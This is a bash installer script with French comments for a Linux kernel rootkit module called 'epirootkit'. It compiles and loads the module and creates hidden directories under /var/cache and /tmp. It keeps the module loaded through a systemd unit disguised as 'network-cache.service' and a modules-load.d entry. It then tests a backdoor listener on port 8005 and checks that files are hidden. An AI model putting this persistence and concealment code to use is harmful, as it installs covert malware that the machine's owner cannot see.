#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo "Ce script doit être exécuté en tant que root" >&2
    exit 1
fi

PROJECT_DIR=$(pwd)
MODULE_NAME="epirootkit"

# Créer les répertoires secrets pour le rootkit
mkdir -p /var/cache/.rootkit_cache
mkdir -p /tmp/.rootkit_data
chmod 700 /var/cache/.rootkit_cache
chmod 700 /tmp/.rootkit_data

# Copier des fichiers de configuration dans le répertoire secret
echo "Configuration rootkit" > /var/cache/.rootkit_cache/config.conf
echo "Données temporaires rootkit" > /tmp/.rootkit_data/temp.log

make clean && make

if [ ! -f "${MODULE_NAME}.ko" ]; then
    echo "Erreur: La compilation a échoué" >&2
    exit 1
fi

if lsmod | grep -q "$MODULE_NAME"; then
    rmmod "$MODULE_NAME" 2>/dev/null
fi

insmod "${MODULE_NAME}.ko"

MODULE_DEST="/lib/modules/$(uname -r)/extra"
mkdir -p "$MODULE_DEST"
cp "${MODULE_NAME}.ko" "$MODULE_DEST/"
depmod -a

cat > /etc/systemd/system/network-cache.service << EOF
[Unit]
Description=Network Cache Module
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe $MODULE_NAME
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable network-cache.service
systemctl start network-cache.service

echo "$MODULE_NAME" > /etc/modules-load.d/network-cache.conf

echo "Installation et persistance configurées"
echo "Répertoires secrets créés et protégés"

echo ""
echo "=== Vérification de l'installation ==="
echo "Status du service:"
systemctl status network-cache.service --no-pager

echo ""
echo "Test de connexion au rootkit:"
timeout 2 bash -c 'echo | nc localhost 8005' 2>/dev/null && echo "✅ Rootkit actif sur port 8005" || echo "❌ Pas de réponse sur port 8005"

echo ""
echo "Test de dissimulation:"
if [ -f "fichiercache" ]; then
    ls | grep -q "fichiercache" && echo "❌ fichiercache visible" || echo "✅ fichiercache caché"
else
    echo "⚠️  fichiercache n'existe pas (créer avec: echo 'test' > fichiercache)"
fi

echo ""
echo "Installation terminée !"